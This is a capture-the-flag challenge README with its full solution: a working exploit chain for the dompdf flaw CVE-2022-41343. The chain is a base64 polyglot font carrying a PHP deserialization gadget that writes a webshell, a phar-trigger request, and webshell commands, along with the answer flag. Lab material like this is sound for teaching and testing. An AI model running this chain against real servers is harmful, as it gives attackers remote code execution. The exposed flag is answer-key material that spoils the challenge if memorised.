# Challenge DOOMPDF

## Author

@pimps

## Category

Web

## Difficulty

Easy/Medium (due to public writeup of cve-2022-41343)

## Description

Web application vulnerable to the new dompdf RCE vulnerability.


## Flags

Flag Number|Flag Value
-|-
1|`flag{DAAAMN_MAN!Th3_name_is_DOMPDF_OR_DOOMPDF??_L0L}`

## Solution


```
A writeup on how to exploit this vulnerability can be found here: https://tantosec.com/blog/cve-2022-41343/

 - /composer.json is exposed in purpose to give a hint of what is deployed in the application.
 - allowRemoteUrl is disabled on dompdf forcing the use of the data:// protocol to write a malicious file to disk.
 - flag is on / with a hard name to guess. This should force people to get RCE to retrieve the flag.

To validate the solve for this challenge execute those requests:

1: Write malicious polyglot font to disk:

http://localhost:9090/pdf.php?title=%3Cstyle%3E@font-face+{+font-family:%27exploit%27;+src:url(%27data:text/plain;base64,AAEAAAANAIAAAwBQRkZUTZ0Eyu8AAAVwAAAAHE9TLzJVeV76AAABWAAAAGBjbWFwAA0DlgAAAcQAAAE6Y3Z0IAAhAnkAAAMAAAAABGdhc3D//wADAAAFaAAAAAhnbHlmPaWWPgAAAwwAAABUaGVhZB8hMOMAAADcAAAANmhoZWEEIAAAAAABFAAAACRobXR4ArkAIQAAAbgAAAAMbG9jYQAqAFQAAAMEAAAACG1heHAARwA5AAABOAAAACBuYW1lrSMjRgAAA2AAAAHjcG9zdP%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%253d%27);+font-weight:%27normal%27;+font-style:%27normal%27;}%3C/style%3E

2: Trigger the phar deserialization:

http://localhost:9090/pdf.php?title=%3Cstyle%3E@font-face+{+font-family:%27TestFont4%27;+src:url(%27phar:///var/www/vendor/dompdf/dompdf/lib/fonts/exploit_normal_86fc9016d4e72049e2ebd39c59c2106c.ttf%23%23%27);+font-weight:%27normal%27;+font-style:%27normal%27;}%3C/style%3E

3: Access webshell:

http://localhost:9090/shell.php?0=id

4: retrieve flag:

http://localhost:9090/shell.php?0=cat%20/this_is_the_flag_read_me_please.txt
```
